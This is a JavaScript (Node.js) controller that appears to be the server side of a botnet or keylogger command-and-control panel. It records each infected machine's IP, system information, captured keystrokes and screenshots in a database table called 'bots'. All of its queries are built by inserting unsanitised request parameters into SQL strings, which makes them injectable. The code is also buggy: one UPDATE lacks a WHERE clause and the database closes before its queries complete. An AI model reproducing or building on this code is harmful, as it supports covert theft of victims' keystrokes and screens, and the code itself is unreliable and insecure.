const sqlite3 = require('sqlite3').verbose();
// const sha1 = require('sha1')
// const alert = require('alert')


const apiCheck = (req, res) => {
    res.send('Success')
}

const apiCreate = (req, res) => {
    try {
        let ip = req.query.ip.split('.').join('-'),
        sysinfo = req.query.sysinfo,
        keylogs = '',
        screenshot = req.query.screenshot,
        status = 'online'
    
        let db = new sqlite3.Database('./db/main.db');
        
        let sql = `INSERT INTO bots (ip, sysinfo, keylogs, screenshots, status) VALUES ("${ip}", "${sysinfo}", "${keylogs}", "${screenshot}", "${status}")`;

        db.run(sql, function(err) {
            if (err) {
              console.log(err.message);
              res.send('Error - check log for mor info')
            }
          });

        db.close()

        res.send('Success')
    } catch (e) {
        res.send(e)
    }
    
}

const apiUpdate = (req, res) => {
    try {
        let ip = req.query.ip.split('.').join('-'),
        sysinfo = req.query.sysinfo,
        keylogs = req.query.keylogs,
        screenshot = req.query.screenshot,
        status = 'online'
    
        let db = new sqlite3.Database('./db/main.db');

        let sql = `SELECT * FROM bots WHERE ip = "${ip}"`;

        db.all(sql, [], function(err, rows) {
            if (err) {
              console.log(err.message);
              res.send('Error - check log for more info')
            }else{
                sql = `UPDATE bots SET sysinfo = "${sysinfo}", keylogs = "${keylogs + '~' + rows[0].keylogs}", screenshots = "${screenshot + '~' + rows[0].screenshots}", status = "${status}")`;

                db.run(sql, function(err) {
                    if (err) {
                        console.log(err.message);
                        res.send('Error - check log for more info')
                    }else{
    
                        res.send('Success')
                    }
                });
            }            
        });

        db.close()

    } catch (e) {
        res.send(e)
    }
}


module.exports = {
    apiCheck,
    apiCreate,
    apiUpdate
}